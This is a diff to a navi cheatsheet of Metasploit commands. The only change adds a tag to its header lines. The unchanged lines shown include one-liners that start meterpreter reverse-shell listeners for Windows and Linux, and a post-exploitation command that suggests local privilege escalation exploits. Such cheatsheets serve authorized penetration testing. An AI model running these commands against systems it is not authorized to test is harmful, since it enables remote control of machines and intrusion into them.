@@ -1,4 +1,4 @@
-% windows, msfconsole, metasploit
+% sealldev, windows, msfconsole, metasploit
 ; From https://github.com/sealldeveloper/navi-cheats/
 
 # [INSIDE METASPLOIT] List required options
@@ -16,13 +16,13 @@ search <search>
 # Setup Windows meterpreter shell listener
 msfconsole -x "use exploit/multi/handler;set LHOST <listener-ip>;set LPORT <listener-port>;set payload windows/meterpreter/reverse_tcp;run"
 
-% linux, msfconsole, metasploit
+% sealldev, linux, msfconsole, metasploit
 # Setup Linux [x64] meterpreter shell listener
 msfconsole -x "use exploit/multi/handler;set LHOST <listener-ip>;set LPORT <listener-port>;set payload linux/x64/meterpreter/reverse_tcp;run"
 
 # Setup Linux [x86] meterpreter shell listener
 msfconsole -x "use exploit/multi/handler;set LHOST <listener-ip>;set LPORT <listener-port>;set payload linux/x86/meterpreter/reverse_tcp;run"
 
-% linux, windows, msfconsole, metasploit, privesc
+% sealldev, linux, windows, msfconsole, metasploit, privesc
 # [INSIDE METASPLOIT] Meterpreter Shell - LPE for Windows and Linux
 run post/multi/recon/local_exploit_suggester
